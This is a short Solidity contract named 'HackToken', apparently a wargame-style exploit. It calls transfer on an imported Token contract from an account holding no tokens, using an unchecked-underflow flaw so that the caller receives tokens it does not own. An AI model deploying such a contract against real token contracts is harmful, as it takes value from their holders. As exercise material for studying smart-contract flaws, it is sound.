pragma solidity ^0.4.18;

import "./Token.sol";

contract HackToken {

  Token private getToken;
  
  function HackToken(address _address) public{
      getToken = Token(_address);
  }
  
  function sendToMe(address myAddress) public {
      getToken.transfer(myAddress, 20);
  }
}